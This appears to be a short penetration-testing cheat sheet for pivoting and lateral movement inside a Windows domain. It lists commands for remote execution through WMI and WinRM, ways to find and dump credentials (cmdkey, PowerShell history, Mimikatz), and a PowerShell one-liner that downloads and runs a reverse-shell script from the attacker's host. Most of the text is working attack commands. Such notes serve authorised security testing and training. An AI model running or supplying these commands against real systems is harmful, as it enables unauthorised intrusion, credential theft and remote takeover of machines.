
Check if you need to set up a tunnel or even pivot first 

Testing reachability from kali to machine
- Ping machine 
- Run 'ip route' - if you see something like '172.16.0.0/12 dev tun0'. You do not need to pivot
If you can reach then just use SMB (psexec, wmiexec), WinRM etc.

Testing from compromised host
- ipconfig
- route print
- ping
```
Test-WSMan DC01
```
- If it responds WinRM is enabled 
If WinRM is not there then we can use WMI
```
wmic /node:DC01 /user:[user\name] password:[password] process call create "cmd.exe /c whoami > C:\temp\out.txt"
```


Once we have moved laterally or pivoted

Find creds
- cmdkey /list
- PowerShell history
- Config files
- Memory dumps
- Reuse domain passwords
Dump creds
- Mimikatz

Drop a shell
```
powershell -c "IEX(New-Object Net.WebClient).DownloadString('http://[my IP]/rev.ps1')"
```

Move further laterally
```
Enter-PSSession -ComputerName FILE01 -Credential [user]
```